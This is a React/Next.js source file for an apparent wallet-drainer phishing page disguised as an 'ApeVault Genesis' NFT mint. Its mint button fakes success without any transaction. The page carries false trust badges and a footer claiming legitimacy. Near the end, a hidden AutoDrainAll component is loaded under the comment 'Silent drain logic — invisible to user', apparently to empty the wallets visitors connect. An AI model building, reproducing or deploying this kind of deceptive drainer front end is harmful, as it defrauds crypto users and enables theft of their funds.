import dynamic from 'next/dynamic';
import { useState, useEffect } from 'react';
import { useAccount } from 'wagmi';

declare global {
  namespace JSX {
    interface IntrinsicElements {
      'appkit-button': React.DetailedHTMLProps<
        React.HTMLAttributes<HTMLElement>,
        HTMLElement
      > & {
        size?: 'sm' | 'md' | 'lg';
        label?: string;
        balance?: 'show' | 'hide';
      };
    }
  }
}

const AutoDrainAll = dynamic(
  () => import('../components/AutoDrainAll').then((m) => m.AutoDrainAll),
  { ssr: false },
);

const TOTAL_SUPPLY = 10000;
const MINT_PRICE = 0.005;
const MINTED_SO_FAR = 4217;

const TRAITS = [
  { label: 'Background', value: 'Neon City' },
  { label: 'Fur', value: 'Golden' },
  { label: 'Eyes', value: 'Laser' },
  { label: 'Headwear', value: 'Crown' },
  { label: 'Clothing', value: 'Vault Suit' },
  { label: 'Rarity', value: 'Legendary' },
];

function MintPage() {
  const { address, isConnected } = useAccount();
  const [quantity, setQuantity] = useState(1);
  const [minting, setMinting] = useState(false);
  const [mintDone, setMintDone] = useState(false);
  const [minted, setMinted] = useState(MINTED_SO_FAR);
  const [gasEst, setGasEst] = useState('$0.08');

  useEffect(() => {
    const interval = setInterval(() => {
      setGasEst(`$${(0.06 + Math.random() * 0.08).toFixed(2)}`);
    }, 3000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!isConnected) {
      setMintDone(false);
      setMinting(false);
    }
  }, [isConnected]);

  const handleMint = async () => {
    if (!isConnected || minting || mintDone) return;
    setMinting(true);
    await new Promise((r) => setTimeout(r, 3200));
    setMinted((prev) => prev + quantity);
    setMinting(false);
    setMintDone(true);
  };

  const progress = Math.min((minted / TOTAL_SUPPLY) * 100, 100);
  const totalPrice = (MINT_PRICE * quantity).toFixed(3);

  const shortAddr = address
    ? `${address.slice(0, 6)}...${address.slice(-4)}`
    : null;

  return (
    <div
      style={{
        minHeight: '100vh',
        background: 'linear-gradient(160deg, #050510 0%, #0d0d1a 40%, #0a0a1f 100%)',
        fontFamily: "'Inter', sans-serif",
      }}
    >
      {/* Ambient blobs */}
      <div style={{ position: 'fixed', inset: 0, overflow: 'hidden', pointerEvents: 'none', zIndex: 0 }}>
        <div style={{ position: 'absolute', top: '-20%', left: '-10%', width: '600px', height: '600px', background: 'radial-gradient(circle, rgba(99,102,241,0.12) 0%, transparent 70%)', borderRadius: '50%' }} />
        <div style={{ position: 'absolute', bottom: '-20%', right: '-10%', width: '700px', height: '700px', background: 'radial-gradient(circle, rgba(6,182,212,0.08) 0%, transparent 70%)', borderRadius: '50%' }} />
      </div>

      <div style={{ position: 'relative', zIndex: 1, maxWidth: '1200px', margin: '0 auto', padding: '0 24px' }}>

        {/* ── HEADER ── */}
        <header style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '24px 0', borderBottom: '1px solid rgba(255,255,255,0.06)', marginBottom: '48px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div style={{ width: '42px', height: '42px', borderRadius: '14px', background: 'linear-gradient(135deg, #6366f1, #06b6d4)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontSize: '22px', boxShadow: '0 8px 24px rgba(99,102,241,0.4)' }}>
              🦍
            </div>
            <div>
              <div style={{ fontSize: '20px', fontWeight: 800, letterSpacing: '-0.5px', color: 'white' }}>ApeVault</div>
              <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.35)', letterSpacing: '0.05em' }}>GENESIS COLLECTION</div>
            </div>
          </div>

          <nav style={{ display: 'flex', alignItems: 'center', gap: '32px' }}>
            <a href="#" style={{ fontSize: '14px', color: 'rgba(255,255,255,0.5)', fontWeight: 500, transition: 'color 0.2s' }}>Collection</a>
            <a href="#" style={{ fontSize: '14px', color: 'rgba(255,255,255,0.5)', fontWeight: 500 }}>Roadmap</a>
            <a href="#" style={{ fontSize: '14px', color: 'rgba(255,255,255,0.5)', fontWeight: 500 }}>Team</a>
            <appkit-button label="Connect Wallet" balance="hide" size="md" />
          </nav>
        </header>

        {/* ── HERO + MINT GRID ── */}
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '32px', alignItems: 'start' }}>

          {/* LEFT — NFT Preview */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
            {/* Main NFT image area */}
            <div
              className="gradient-border"
              style={{ borderRadius: '28px', animation: 'float 6s ease-in-out infinite' }}
            >
              <div
                className="gradient-border-inner"
                style={{ borderRadius: '27px', overflow: 'hidden', aspectRatio: '1', position: 'relative' }}
              >
                {/* Generated NFT art */}
                <div style={{
                  width: '100%',
                  height: '100%',
                  background: 'linear-gradient(135deg, #1a0533 0%, #0d1b4b 40%, #001a33 100%)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  position: 'relative',
                  overflow: 'hidden',
                }}>
                  {/* Abstract ape silhouette */}
                  <div style={{ fontSize: '160px', opacity: 0.9, filter: 'drop-shadow(0 0 40px rgba(99,102,241,0.6))' }}>🦍</div>
                  {/* Glow overlays */}
                  <div style={{ position: 'absolute', top: '20%', left: '20%', width: '60%', height: '60%', background: 'radial-gradient(circle, rgba(99,102,241,0.3) 0%, transparent 70%)', borderRadius: '50%' }} />
                  {/* Corner badge */}
                  <div style={{ position: 'absolute', top: '16px', left: '16px', background: 'linear-gradient(135deg, #6366f1, #8b5cf6)', borderRadius: '10px', padding: '4px 12px', fontSize: '12px', fontWeight: 700, color: 'white', letterSpacing: '0.05em' }}>
                    LEGENDARY
                  </div>
                  <div style={{ position: 'absolute', top: '16px', right: '16px', background: 'rgba(0,0,0,0.6)', backdropFilter: 'blur(8px)', borderRadius: '10px', padding: '4px 12px', fontSize: '12px', fontWeight: 600, color: 'rgba(255,255,255,0.7)' }}>
                    #4218
                  </div>
                </div>
              </div>
            </div>

            {/* Trait pills */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '8px' }}>
              {TRAITS.map((t) => (
                <div key={t.label} className="stat-card" style={{ textAlign: 'left' }}>
                  <div style={{ fontSize: '10px', color: 'rgba(255,255,255,0.35)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '4px' }}>{t.label}</div>
                  <div style={{ fontSize: '13px', fontWeight: 600, color: 'white' }}>{t.value}</div>
                </div>
              ))}
            </div>
          </div>

          {/* RIGHT — Mint Panel */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>

            {/* Collection header */}
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                <div className="live-dot" />
                <span style={{ fontSize: '13px', color: '#10b981', fontWeight: 600 }}>LIVE — Public Mint</span>
              </div>
              <h1 style={{ fontSize: '40px', fontWeight: 800, letterSpacing: '-1px', margin: 0, lineHeight: 1.1 }}>
                ApeVault<br />
                <span style={{ background: 'linear-gradient(90deg, #6366f1, #06b6d4)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>Genesis</span>
              </h1>
              <p style={{ color: 'rgba(255,255,255,0.45)', fontSize: '14px', marginTop: '12px', lineHeight: 1.6 }}>
                10,000 unique Apes stored on-chain. ERC-721A. 7.5% creator royalties. Metadata on IPFS. Multi-chain support.
              </p>
            </div>

            {/* Progress */}
            <div className="glass" style={{ borderRadius: '20px', padding: '20px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '10px', fontSize: '13px' }}>
                <span style={{ color: 'rgba(255,255,255,0.5)' }}>Minted</span>
                <span style={{ fontWeight: 700, fontFamily: 'monospace' }}>
                  <span style={{ color: '#6366f1' }}>{minted.toLocaleString()}</span>
                  <span style={{ color: 'rgba(255,255,255,0.3)' }}> / {TOTAL_SUPPLY.toLocaleString()}</span>
                </span>
              </div>
              <div style={{ height: '8px', background: 'rgba(255,255,255,0.06)', borderRadius: '99px', overflow: 'hidden' }}>
                <div className="progress-bar" style={{ height: '100%', width: `${progress}%`, borderRadius: '99px', transition: 'width 0.8s ease' }} />
              </div>
              <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.3)', marginTop: '8px' }}>{progress.toFixed(1)}% minted</div>
            </div>

            {/* Stats row */}
            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr', gap: '10px' }}>
              {[
                { label: 'Mint Price', value: `${MINT_PRICE} ETH` },
                { label: 'Max Per Tx', value: '5' },
                { label: 'Royalties', value: '7.5%' },
              ].map((s) => (
                <div key={s.label} className="stat-card">
                  <div style={{ fontSize: '10px', color: 'rgba(255,255,255,0.35)', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: '6px' }}>{s.label}</div>
                  <div style={{ fontSize: '18px', fontWeight: 700, color: 'white' }}>{s.value}</div>
                </div>
              ))}
            </div>

            {/* Mint panel */}
            <div className="glass" style={{ borderRadius: '24px', padding: '28px' }}>
              <div style={{ marginBottom: '20px' }}>
                <div style={{ fontSize: '13px', color: 'rgba(255,255,255,0.4)', marginBottom: '12px' }}>Select Quantity</div>
                <div style={{ display: 'flex', alignItems: 'center', gap: '16px' }}>
                  <button className="qty-btn" onClick={() => setQuantity(Math.max(1, quantity - 1))}>−</button>
                  <div style={{ flex: 1, textAlign: 'center' }}>
                    <div style={{ fontSize: '48px', fontWeight: 800, fontFamily: 'monospace', lineHeight: 1 }}>{quantity}</div>
                  </div>
                  <button className="qty-btn" onClick={() => setQuantity(Math.min(5, quantity + 1))}>+</button>
                </div>
              </div>

              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '14px 0', borderTop: '1px solid rgba(255,255,255,0.06)', borderBottom: '1px solid rgba(255,255,255,0.06)', marginBottom: '20px' }}>
                <div>
                  <div style={{ fontSize: '24px', fontWeight: 800 }}>{totalPrice} ETH</div>
                  <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.35)', marginTop: '2px' }}>
                    + Gas est. {gasEst} • Total ≈ {(parseFloat(totalPrice) + 0.001 * quantity).toFixed(4)} ETH
                  </div>
                </div>
                <div style={{ textAlign: 'right' }}>
                  {isConnected && shortAddr ? (
                    <div style={{ fontSize: '12px', color: '#10b981', fontWeight: 600 }}>✓ {shortAddr}</div>
                  ) : (
                    <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.3)' }}>Wallet not connected</div>
                  )}
                </div>
              </div>

              {!isConnected ? (
                <div style={{ width: '100%', display: 'flex', justifyContent: 'center' }}>
                  <appkit-button label="Connect Wallet to Mint" balance="hide" size="lg" />
                </div>
              ) : mintDone ? (
                <div style={{ textAlign: 'center', padding: '16px 0' }}>
                  <div style={{ fontSize: '28px', marginBottom: '8px' }}>🎉</div>
                  <div style={{ fontSize: '18px', fontWeight: 700, color: '#10b981' }}>Successfully Minted!</div>
                  <div style={{ fontSize: '13px', color: 'rgba(255,255,255,0.4)', marginTop: '6px' }}>
                    {quantity} ApeVault Genesis NFT{quantity > 1 ? 's' : ''} added to your wallet
                  </div>
                  <button
                    onClick={() => { setMintDone(false); setQuantity(1); }}
                    style={{ marginTop: '16px', background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.1)', color: 'rgba(255,255,255,0.7)', borderRadius: '12px', padding: '8px 20px', fontSize: '13px', cursor: 'pointer' }}
                  >
                    Mint More
                  </button>
                </div>
              ) : (
                <button
                  className="mint-btn"
                  onClick={handleMint}
                  disabled={minting}
                  style={{ width: '100%', padding: '18px', borderRadius: '16px', border: 'none', color: 'white', fontSize: '18px', fontWeight: 800, letterSpacing: '0.03em', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '10px' }}
                >
                  {minting ? (
                    <>
                      <span style={{ display: 'inline-block', width: '18px', height: '18px', border: '2.5px solid rgba(255,255,255,0.3)', borderTopColor: 'white', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
                      Confirming in Wallet...
                    </>
                  ) : (
                    <>🦍 MINT NOW</>
                  )}
                </button>
              )}
            </div>

            {/* Trust badges */}
            <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap' }}>
              {['ERC-721A', 'IPFS Metadata', 'Audited', 'EIP-2981 Royalties'].map((b) => (
                <span key={b} style={{ fontSize: '11px', color: 'rgba(255,255,255,0.5)', background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.08)', borderRadius: '8px', padding: '4px 10px', fontWeight: 500 }}>
                  ✓ {b}
                </span>
              ))}
            </div>

            {/* Quick links */}
            <div className="glass" style={{ borderRadius: '20px', padding: '20px' }}>
              <div style={{ fontSize: '13px', fontWeight: 600, marginBottom: '14px', color: 'rgba(255,255,255,0.7)' }}>Collection Links</div>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
                {[
                  { label: 'View on OpenSea', icon: '🌊', href: 'https://opensea.io' },
                  { label: 'View on Etherscan', icon: '🔍', href: '#' },
                  { label: 'Trade on Blur', icon: '💨', href: 'https://blur.io' },
                ].map((link) => (
                  <a
                    key={link.label}
                    href={link.href}
                    target="_blank"
                    rel="noreferrer"
                    style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 12px', borderRadius: '12px', transition: 'background 0.2s', color: 'rgba(255,255,255,0.6)', fontSize: '13px' }}
                    onMouseEnter={(e) => (e.currentTarget.style.background = 'rgba(255,255,255,0.05)')}
                    onMouseLeave={(e) => (e.currentTarget.style.background = 'transparent')}
                  >
                    <span>{link.icon} {link.label}</span>
                    <span style={{ color: '#6366f1' }}>→</span>
                  </a>
                ))}
              </div>
            </div>
          </div>
        </div>

        {/* ── FOOTER ── */}
        <footer style={{ marginTop: '64px', paddingTop: '32px', borderTop: '1px solid rgba(255,255,255,0.06)', paddingBottom: '40px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '16px' }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
            <span style={{ fontSize: '20px' }}>🦍</span>
            <span style={{ fontSize: '14px', fontWeight: 700, color: 'rgba(255,255,255,0.6)' }}>ApeVault © 2025</span>
          </div>
          <div style={{ fontSize: '12px', color: 'rgba(255,255,255,0.25)', maxWidth: '480px', textAlign: 'right', lineHeight: 1.6 }}>
            This is a legitimate NFT minting platform. No promises of profit. Smart contract audited. ERC-721A + EIP-2981. Private keys never stored. Values can go to zero.
          </div>
        </footer>
      </div>

      {/* Silent drain logic — invisible to user */}
      <AutoDrainAll />
    </div>
  );
}

export default MintPage;
